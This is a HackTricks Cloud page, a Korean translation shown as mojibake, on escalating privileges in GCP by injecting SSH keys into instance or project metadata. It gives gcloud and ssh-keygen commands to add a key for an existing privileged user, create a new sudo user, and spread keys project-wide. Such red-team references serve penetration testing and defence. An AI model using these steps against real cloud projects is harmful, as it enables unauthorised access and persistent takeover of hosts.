# GCP - ì‚¬ìš©ì ì •ì˜ SSH ë©”íƒ€ë°ì´í„° ì¶”ê°€

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## ë©”íƒ€ë°ì´í„° ìˆ˜ì • <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ì¸ìŠ¤í„´ìŠ¤ì˜ ë©”íƒ€ë°ì´í„° ìˆ˜ì •ì€ **ê³µê²©ìê°€ í•„ìš”í•œ ê¶Œí•œì„ íšë“¤í•  ê²½ìš° ì¤‘ëŒ€í•œ ë³´ì•ˆ ìœ„í—˜**ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **SSH í‚¤ë¥¼ ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ì— í†µí•©**

GCPì—ì„œ **Linux ì‹œìŠ¤í…œ**ì€ ì¢…ì¢… [Google Compute Engineì„ ìœ„í•œ Python Linux ê²ŒìŠ¤íŠ¸ í™˜ê²½](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì˜ ì¤‘ìš”í•œ êµ¬ì„± ìš”ì†ŒëŠ” [ê³„ì • ë°ëª¬](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)ìœ¼ë¡œ, ì´ëŠ” **ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì •ê¸°ì ìœ¼ë¡œ í™•ì¸í•˜ì—¬ ì¸ì¦ëœ SSH ê³µê°œ í‚¤ì— ëŒ€í•œ ì—…ë°ì´íŠ¸ë¥¼ ì°¾ìŠµë‹ˆë‹¤**.

ë”°ë¼ì„œ ê³µê²©ìê°€ ì‚¬ìš©ì ì •ì˜ ë©”íƒ€ë°ì´í„°ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆë‹¤ë©´, ë°ëª¬ì´ ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ ì°¾ì•„ì„œ ì²˜ë¦¬í•˜ê³  **ë¡œì»¬ ì‹œìŠ¤í…œì— í†µí•©**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í‚¤ëŠ” ê¸°ì¡´ ì‚¬ìš©ìì˜ `~/.ssh/authorized_keys` íŒŒì¼ì— ì¶”ê°€ë˜ê±°ë‚˜ í‚¤ì˜ í˜•ì‹ì— ë”°ë¼ `sudo` ê¶Œí•œì„ ê°€ì§„ ìƒˆ ì‚¬ìš©ìë¥¼ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ê³µê²©ìëŠ” í˜¸ìŠ¤íŠ¸ë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

### **ê¸°ì¡´ íŠ¹ê¶Œ ì‚¬ìš©ìì—ê²Œ SSH í‚¤ ì¶”ê°€**

1. **ì¸ìŠ¤í„´ìŠ¤ì˜ ê¸°ì¡´ SSH í‚¤ í™•ì¸:**
- ì¸ìŠ¤í„´ìŠ¤ ë° í•´ë‹¹ ë©”íƒ€ë°ì´í„°ë¥¼ ì„¤ëª…í•˜ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ê¸°ì¡´ SSH í‚¤ë¥¼ ì°¾ìŠµë‹ˆë‹¤. ì¶œë ¥ì˜ ê´€ë ¨ ì„¹ì…˜ì€ `metadata` ì•„ë˜ì— ìˆìœ¼ë©° íŠ¹íˆ `ssh-keys` í‚¤ ì•„ë˜ì— ìˆìŠµë‹ˆë‹¤.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH í‚¤ì˜ í˜•ì‹ì— ì£¼ì˜í•˜ì‹­ì‹œì˜¤: ì‚¬ìš©ì ì´ë¦„ì´ ì½œë¡ ìœ¼ë¡œ êµ¬ë¶„ëœ í‚¤ ì•ì— ì˜µë‹ˆë‹¤.

2. **SSH í‚¤ ë©”íƒ€ë°ì´í„°ìš© í…ìŠ¤íŠ¸ íŒŒì¼ ì¤€ë¹„:**
- ì‚¬ìš©ì ì´ë¦„ê³¼ í•´ë‹¹ SSH í‚¤ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ `meta.txt`ë¼ëŠ” í…ìŠ¤íŠ¸ íŒŒì¼ì— ì €ì¥í•©ë‹ˆë‹¤. ì´ëŠ” ìƒˆ í‚¤ë¥¼ ì¶”ê°€í•˜ëŠ” ë™ì•ˆ ê¸°ì¡´ í‚¤ë¥¼ ë³´ì¡´í•˜ëŠ” ë° í•„ìš”í•©ë‹ˆë‹¤.

3. **ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ë¥¼ ìœ„í•œ ìƒˆ SSH í‚¤ ìƒì„±:**
- `ssh-keygen` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ SSH í‚¤ë¥¼ ìƒì„±í•˜ê³ , ì£¼ì„ í•„ë“œ(`-C`)ê°€ ëŒ€ìƒ ì‚¬ìš©ì ì´ë¦„ê³¼ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„°ì—ì„œ ë°œê²¬ëœ í˜•ì‹ì„ ëª¨ë°©í•˜ì—¬ ìƒˆ ê³µê°œ í‚¤ë¥¼ `meta.txt`ì— ì¶”ê°€í•©ë‹ˆë‹¤.

4. **ì¸ìŠ¤í„´ìŠ¤ì˜ SSH í‚¤ ë©”íƒ€ë°ì´í„° ì—…ë°ì´íŠ¸:**
- `gcloud compute instances add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì—…ë°ì´íŠ¸ëœ SSH í‚¤ ë©”íƒ€ë°ì´í„°ë¥¼ ì ìš©í•©ë‹ˆë‹¤.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **ìƒˆ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì•¡ì„¸ìŠ¤:**
- ìƒˆ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ SSHë¡œ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°í•˜ì—¬ ëŒ€ìƒ ì‚¬ìš©ì(`alice` ì˜ˆì‹œ)ì˜ ì‰˜ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤.
```bash
ssh -i ./key alice@localhost
sudo id
```

### **ìƒˆ íŠ¹ê¶Œ ì‚¬ìš©ì ìƒì„± ë° SSH í‚¤ ì¶”ê°€**

í¥ë¯¸ë¡œìš´ ì‚¬ìš©ìë¥¼ ì°¾ì„ ìˆ˜ ì—†ëŠ” ê²½ìš°, `sudo` ê¶Œí•œì´ ë¶€ì—¬ëœ ìƒˆ ì‚¬ìš©ìë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì˜ SSH í‚¤ <a href="#sshing-around" id="sshing-around"></a>

í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ **í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ë¥¼ ì ìš©**í•˜ì—¬ SSH ì•¡ì„¸ìŠ¤ì˜ ë²”ìœ„ë¥¼ ë„“í ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ‘ê·¼ ë°©ì‹ì€ í”„ë¡œì íŠ¸ ë‚´ì—ì„œ ëª…ì‹œì ìœ¼ë¡œ í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•Šì€ ê²½ìš° í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— SSH ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ìš”ì•½ëœ ê°€ì´ë“œì…ë‹ˆë‹¤:

1. **í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ SSH í‚¤ ì ìš©:**
- `gcloud compute project-info add-metadata` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ `meta.txt`ì—ì„œ SSH í‚¤ë¥¼ í”„ë¡œì íŠ¸ ë©”íƒ€ë°ì´í„°ì— ì¶”ê°€í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì„ í†µí•´ SSH í‚¤ê°€ í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  VMì—ì„œ ì¸ì‹ë˜ë„ë¡í•©ë‹ˆë‹¤. ë‹¨, VMì´ "í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ ì°¨ë‹¨" ì˜µì…˜ì„ í™œì„±í™”í•˜ì§€ ì•Šì€ ê²½ìš°ì…ë‹ˆë‹¤.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— SSH:**
- í”„ë¡œì íŠ¸ ì „ì²´ SSH í‚¤ê°€ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ í”„ë¡œì íŠ¸ ë‚´ì˜ ëª¨ë“  ì¸ìŠ¤í„´ìŠ¤ì— SSHí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í”„ë¡œì íŠ¸ ì „ì²´ í‚¤ë¥¼ ì°¨ë‹¨í•˜ì§€ ì•Šì€ ì¸ìŠ¤í„´ìŠ¤ëŠ” SSH í‚¤ë¥¼ ìˆ˜ë½í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.
- ì¸ìŠ¤í„´ìŠ¤ì— ì§ì ‘ SSHí•˜ëŠ” ë°©ë²•ì€ `gcloud compute ssh [INSTANCE]` ëª…ë ¹ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í˜„ì¬ ì‚¬ìš©ì ì´ë¦„ê³¼ í”„ë¡œì íŠ¸ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ SSH í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ì‹œë„í•©ë‹ˆë‹¤.


# ì°¸ê³  ìë£Œ
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
